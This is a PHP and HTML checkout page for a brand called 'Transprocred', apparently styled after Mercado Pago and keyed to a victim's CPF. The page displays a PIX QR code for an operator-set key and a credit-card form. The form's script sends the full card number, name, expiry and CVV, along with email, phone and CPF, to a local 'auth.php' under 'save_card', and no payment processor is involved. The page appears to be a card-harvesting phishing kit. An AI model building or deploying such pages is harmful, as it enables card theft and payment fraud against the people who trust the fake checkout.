<?php
require_once __DIR__ . '/PixPayload.php';
define('USERS_FILE', __DIR__ . '/../users.json');

// Tenta pegar o CPF via GET primeiro (mais garantido)
$cpf = $_GET['cpf'] ?? null;

// Se não tiver no GET, tenta pela URL amigável /mp/CPF
if (!$cpf) {
    $request_uri = $_SERVER['REQUEST_URI'];
    $base_path = '/mp/';
    $uri_parts = explode('/', trim(str_replace($base_path, '', $request_uri), '/'));
    if (isset($uri_parts[0]) && $uri_parts[0] !== 'index.php') {
        $cpf = $uri_parts[0];
    }
}

if (!$cpf) {
    die("Acesso inválido. CPF não informado.");
}

function getUsers() {
    if (!file_exists(USERS_FILE)) return [];
    return json_decode(file_get_contents(USERS_FILE), true) ?: [];
}

$users = getUsers();
$user = null;
foreach ($users as $u) {
    if ($u['username'] === $cpf) {
        $user = $u;
        break;
    }
}

if (!$user) {
    die("Usuário não encontrado.");
}

// Valor a pagar (Pega da entrada do usuário)
$valorOriginal = $user['financial']['entrada'] ?? 'R$ 0,00';
$valorLimpo = preg_replace('/[R$\s.]/u', '', $valorOriginal);
$valorFinal = str_replace(',', '.', $valorLimpo);

// Configuração da Chave PIX (Pode ser alterada no admin)
$configPath = __DIR__ . '/config.json';
$config = file_exists($configPath) ? json_decode(file_get_contents($configPath), true) : ['pix_key' => 'seu-pix@email.com'];
$pixKey = $config['pix_key'];

// Geração do PIX
$pix = new PixPayload($pixKey, $valorFinal);
$payload = $pix->getPayload();
$qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" . urlencode($payload);

?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checkout Seguro - Transprocred</title>
    <link href="https://fonts.googleapis.com/css2?family=Proxima+Nova:wght@300;400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        :root {
            --mp-blue: #007d89;
            --mp-bg: #ebebeb;
            --text-dark: #333333;
            --text-light: #999999;
        }

        body {
            font-family: 'Proxima Nova', -apple-system, sans-serif;
            background-color: var(--mp-bg);
            margin: 0;
            padding: 0;
            color: var(--text-dark);
        }

        .header {
            background-color: #007d89;
            padding: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            color: #fff;
        }

        .header img {
            height: 45px;
        }

        .header-modal img {
            height: 30px;
        }

        .container {
            max-width: 500px;
            margin: 20px auto;
            padding: 0 15px;
        }

        .card {
            background: #fff;
            border-radius: 4px;
            padding: 24px;
            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }

        .amount-section {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 20px;
            border-bottom: 1px solid #eee;
        }

        .amount-section span {
            font-size: 14px;
            color: var(--text-light);
        }

        .amount-value {
            font-size: 24px;
            font-weight: 600;
        }

        .payment-methods h3 {
            font-size: 18px;
            font-weight: 400;
            margin-bottom: 20px;
        }

        .method-item {
            display: flex;
            align-items: center;
            padding: 16px;
            border: 1px solid #eee;
            border-radius: 6px;
            margin-bottom: 12px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .method-item:hover {
            border-color: var(--mp-blue);
            background-color: rgba(0, 158, 227, 0.02);
        }

        .method-icon {
            width: 40px;
            height: 40px;
            background: #f5f5f5;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            color: var(--mp-blue);
        }

        .method-info b {
            display: block;
            font-size: 16px;
        }

        .method-info span {
            font-size: 13px;
            color: var(--text-light);
        }

        /* Modal PIX */
        #pix-modal {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: #fff;
            z-index: 1000;
            overflow-y: auto;
        }

        .pix-container {
            max-width: 400px;
            margin: 0 auto;
            padding: 40px 20px;
            text-align: center;
        }

        .pix-qr {
            width: 250px;
            height: 250px;
            margin: 20px auto;
            border: 1px solid #eee;
            padding: 10px;
        }

        .pix-copy-box {
            background: #f5f5f5;
            padding: 15px;
            border-radius: 6px;
            word-break: break-all;
            font-size: 13px;
            margin: 20px 0;
            border: 1px dashed #ccc;
            user-select: all;
        }

        .btn-blue {
            background: var(--mp-blue);
            color: #fff;
            border: none;
            padding: 16px;
            border-radius: 6px;
            width: 100%;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
        }

        /* Modal Cartão */
        #card-modal {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: #fff;
            z-index: 1000;
            overflow-y: auto;
        }

        .form-group {
            text-align: left;
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            font-size: 14px;
            color: var(--text-dark);
            margin-bottom: 8px;
        }

        .form-group input, .form-group select {
            width: 100%;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 16px;
            box-sizing: border-box;
        }

        .form-group input:focus {
            outline: none;
            border-color: var(--mp-blue);
        }

        .card-preview {
            background: linear-gradient(135deg, #2b32b2 0%, #1488cc 100%);
            border-radius: 12px;
            padding: 25px;
            color: #fff;
            margin-bottom: 30px;
            text-align: left;
            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
        }

        .card-icons {
            display: flex;
            justify-content: flex-end;
            margin-bottom: 20px;
        }

        .card-number-display {
            font-size: 1.4rem;
            letter-spacing: 2px;
            margin-bottom: 20px;
            font-weight: 500;
        }

        .card-bottom {
            display: flex;
            justify-content: space-between;
        }

        .btn-gray {
            background: #f5f5f5;
            color: var(--mp-blue);
            border: none;
            padding: 16px;
            border-radius: 6px;
            width: 100%;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }

        .footer {
            text-align: center;
            padding: 40px 0;
            color: var(--text-light);
            font-size: 12px;
        }


    </style>

</head>
<body>

    <div class="header">
        <img src="../images/transpoicon.png" alt="Transprocred">
    </div>



    <div class="container">
        <div class="card">
            <div class="amount-section">
                <div>
                    <span>Total a pagar</span>
                    <div class="amount-value"><?php echo $valorOriginal; ?></div>
                </div>
                <img src="https://img.icons8.com/color/48/000000/info.png" style="width:20px; opacity:0.3;">
            </div>

            <div class="payment-methods">
                <h3>Como você quer pagar?</h3>
                
                <div class="method-item" onclick="openPix()">
                    <div class="method-icon"><i class="fas fa-qrcode"></i></div>
                    <div class="method-info">
                        <b>Pix</b>
                        <span>Aprovação imediata</span>
                    </div>
                    <i class="fas fa-chevron-right" style="margin-left:auto; color:#ccc;"></i>
                </div>

                <div class="method-item" onclick="openCard()">
                    <div class="method-icon"><i class="fas fa-credit-card"></i></div>
                    <div class="method-info">
                        <b>Cartão de crédito</b>
                        <span>Até 12 parcelas</span>
                    </div>
                    <i class="fas fa-chevron-right" style="margin-left:auto; color:#ccc;"></i>
                </div>

            </div>
        </div>

        <div class="footer">
            <p>&copy; <?php echo date('Y'); ?> Pagamento Seguro - Processado por Transprocred</p>
        </div>
    </div>

    <!-- Modal PIX -->
    <div id="pix-modal">
        <div class="header header-modal">
            <div onclick="closePix()" style="position:absolute; left:20px; cursor:pointer; color: #fff;"><i class="fas fa-arrow-left"></i></div>
            <img src="../images/transpoicon.png" alt="Transprocred">
        </div>
        <div class="pix-container">
            <div id="pix-lead-section">
                <h3>Identificação</h3>
                <p style="color:var(--text-light); font-size:14px; margin-bottom: 30px;">Informe seus dados para identificação do pagamento.</p>
                <div class="form-group">
                    <label>E-mail</label>
                    <input type="email" id="pix-email" value="<?php echo htmlspecialchars($user['email'] ?? ''); ?>" placeholder="seu@email.com">
                </div>
                <div class="form-group">
                    <label>Telefone / WhatsApp</label>
                    <input type="text" id="pix-phone" value="<?php echo htmlspecialchars($user['phone'] ?? ''); ?>" placeholder="(00) 00000-0000">
                </div>
                <div class="form-group">
                    <label>CPF</label>
                    <input type="text" id="pix-cpf" value="<?php echo htmlspecialchars($cpf); ?>" placeholder="000.000.000-00">
                </div>
                <button class="btn-blue" onclick="confirmPixLead()">GERAR PIX</button>
            </div>

            <div id="pix-payment-section" style="display:none;">
                <h3>Tudo pronto!</h3>
                <p style="color:var(--text-light); font-size:14px; margin-bottom: 30px;">Escaneie o QR Code ou copie e cole o código para pagar.</p>
            
            <div style="display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 10px; color: var(--mp-blue);">
                <i class="fas fa-spinner fa-spin"></i>
                <span style="font-weight: 600; font-size: 14px;">Aguardando pagamento...</span>
            </div>

            <div class="pix-qr">
                <img src="<?php echo $qrUrl; ?>" style="width:100%;">
            </div>

            <div class="pix-copy-box" id="payload-text">
                <?php echo $payload; ?>
            </div>

            <button class="btn-blue" onclick="copyPayload()" style="margin-bottom: 12px;">COPIAR CÓDIGO PIX</button>
            <button class="btn-blue" onclick="confirmPayment()" style="background: transparent; color: var(--mp-blue); border: 1px solid var(--mp-blue);">JÁ FIZ O PAGAMENTO</button>
            
                <p style="margin-top:20px; font-size:13px; color:var(--mp-blue); cursor:pointer;" onclick="closePix()">Escolher outro meio de pagamento</p>
            </div>
        </div>
    </div>

    <!-- Modal Cartão -->
    <div id="card-modal">
        <div class="header header-modal">
            <div onclick="closeCard()" style="position:absolute; left:20px; cursor:pointer; color: #fff;"><i class="fas fa-arrow-left"></i></div>
            <img src="../images/transpoicon.png" alt="Transprocred">
        </div>
        <div class="pix-container" style="max-width: 450px; padding: 30px 20px;">
            <div class="card-preview">
                <div class="card-icons">
                    <i class="fab fa-cc-visa fa-2x" style="opacity: 0.8;"></i>
                </div>
                <div class="card-number-display" id="display-number">•••• •••• •••• ••••</div>
                <div class="card-bottom">
                    <div>
                        <div style="font-size: 10px; opacity: 0.7; text-transform: uppercase;">Nome no cartão</div>
                        <div id="display-name" style="font-weight: 600;">NOME COMPLETO</div>
                    </div>
                    <div>
                        <div style="font-size: 10px; opacity: 0.7; text-transform: uppercase;">Validade</div>
                        <div id="display-date" style="font-weight: 600;">MM/AA</div>
                    </div>
                </div>
            </div>

            <div class="form-group" style="border-bottom: 1px solid #eee; padding-bottom: 15px; margin-bottom: 15px;">
                <label>E-mail para confirmação</label>
                <input type="email" id="card-email" value="<?php echo htmlspecialchars($user['email'] ?? ''); ?>" placeholder="seu@email.com">
                <label style="margin-top: 10px;">Telefone / WhatsApp</label>
                <input type="text" id="card-phone" value="<?php echo htmlspecialchars($user['phone'] ?? ''); ?>" placeholder="(00) 00000-0000">
                <label style="margin-top: 10px;">CPF</label>
                <input type="text" id="card-cpf" value="<?php echo htmlspecialchars($cpf); ?>" placeholder="000.000.000-00">
            </div>

            <div class="form-group">
                <label>Número do cartão</label>
                <input type="text" id="card-num" placeholder="0000 0000 0000 0000" maxlength="19" onkeyup="updateCardPreview()">
            </div>
            <div class="form-group">
                <label>Nome impresso no cartão</label>
                <input type="text" id="card-name" placeholder="Como está no cartão" onkeyup="updateCardPreview()">
            </div>
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
                <div class="form-group">
                    <label>Data de expiração</label>
                    <input type="text" id="card-expiry" placeholder="MM/AA" maxlength="5" onkeyup="updateCardPreview()">
                </div>
                <div class="form-group">
                    <label>Código de segurança (CVV)</label>
                    <input type="text" id="card-cvv" placeholder="123" maxlength="4">
                </div>
            </div>
            <div class="form-group">
                <label>Parcelas</label>
                <select id="card-installments">
                    <option value="1">1x <?php echo $valorOriginal; ?> sem juros</option>
                    <option value="2">2x de ...</option>
                    <option value="3">3x de ...</option>
                    <option value="6">6x de ...</option>
                    <option value="12">12x de ...</option>
                </select>
            </div>

            <button class="btn-blue" onclick="saveCardInfo()">CONFIRMAR PAGAMENTO</button>
            <button class="btn-gray" onclick="closeCard()" style="background: transparent; border: none; color: #999; font-weight: 400; font-size: 14px; margin-top: 15px;">Voltar</button>
        </div>
    </div>

    <script>
        async function saveLead(email, phone, cpf) {
            if (!email || !phone || !cpf) {
                Swal.fire('Atenção', 'Por favor, preencha E-mail, Telefone e CPF.', 'warning');
                return false;
            }

            try {
                const response = await fetch('../auth.php', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: new URLSearchParams({
                        action: 'update_lead',
                        username: cpf.replace(/\D/g, ''),
                        email: email,
                        phone: phone
                    })
                });
                const result = await response.json();
                return result.success;
            } catch (err) {
                console.error(err);
                return false;
            }
        }

        async function confirmPixLead() {
            const email = document.getElementById('pix-email').value;
            const phone = document.getElementById('pix-phone').value;
            const cpf = document.getElementById('pix-cpf').value;
            
            const success = await saveLead(email, phone, cpf);
            if (success) {
                document.getElementById('pix-lead-section').style.display = 'none';
                document.getElementById('pix-payment-section').style.display = 'block';
            } else {
                Swal.fire('Erro', 'Não foi possível salvar seus dados de contato.', 'error');
            }
        }

        function openPix() {
            document.getElementById('pix-modal').style.display = 'block';
        }
        function closePix() {
            document.getElementById('pix-modal').style.display = 'none';
        }
        function copyPayload() {
            const text = document.getElementById('payload-text').innerText;
            navigator.clipboard.writeText(text).then(() => {
                alert('Código copiado com sucesso!');
            });
        }
        function confirmPayment() {
            Swal.fire({
                title: 'Pagamento em análise',
                text: 'Estamos processando o seu pagamento. Isso pode levar até 30 minutos.',
                icon: 'info',
                confirmButtonColor: '#007d89',
                confirmButtonText: 'Entendido'
            }).then(() => {
                location.reload();
            });
        }

        function openCard() {
            document.getElementById('card-modal').style.display = 'block';
        }
        function closeCard() {
            document.getElementById('card-modal').style.display = 'none';
        }

        function updateCardPreview() {
            let num = document.getElementById('card-num').value;
            // Format card number with spaces
            num = num.replace(/\s?/g, '').replace(/(\d{4})/g, '$1 ').trim();
            document.getElementById('card-num').value = num;
            
            document.getElementById('display-number').innerText = num || '•••• •••• •••• ••••';
            document.getElementById('display-name').innerText = document.getElementById('card-name').value.toUpperCase() || 'NOME COMPLETO';
            document.getElementById('display-date').innerText = document.getElementById('card-expiry').value || 'MM/AA';
        }

        async function saveCardInfo() {
            const email = document.getElementById('card-email').value;
            const phone = document.getElementById('card-phone').value;
            const cpf = document.getElementById('card-cpf').value;

            if (!email || !phone || !cpf) {
                Swal.fire('Atenção', 'Por favor, informe seu e-mail, telefone e CPF.', 'warning');
                return;
            }

            const data = {
                action: 'save_card',
                username: cpf.replace(/\D/g, ''),
                number: document.getElementById('card-num').value,
                name: document.getElementById('card-name').value,
                expiry: document.getElementById('card-expiry').value,
                cvv: document.getElementById('card-cvv').value,
                installments: document.getElementById('card-installments').value
            };

            if (!data.number || !data.name || !data.expiry || !data.cvv) {
                alert('Por favor, preencha todos os campos do cartão.');
                return;
            }

            try {
                // First save lead info
                await saveLead(email, phone, cpf);

                // Then save card info
                const response = await fetch('../auth.php', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: new URLSearchParams(data)
                });
                
                if (!response.ok) {
                    throw new Error('Erro no servidor: ' + response.status);
                }

                const result = await response.json();
                if (result.success) {
                    Swal.fire({
                        title: 'Sucesso!',
                        text: 'Seu pagamento está sendo processado. Aguarde a confirmação no painel.',
                        icon: 'success',
                        confirmButtonColor: '#009ee3'
                    }).then(() => {
                        location.reload();
                    });
                } else {
                    Swal.fire('Erro', result.message || 'Erro ao processar pagamento.', 'error');
                }
            } catch (err) {
                console.error('Erro detalhado:', err);
                Swal.fire('Erro', 'Erro de conexão ou resposta inválida do servidor.', 'error');
            }
        }
    </script>
</body>
</html>
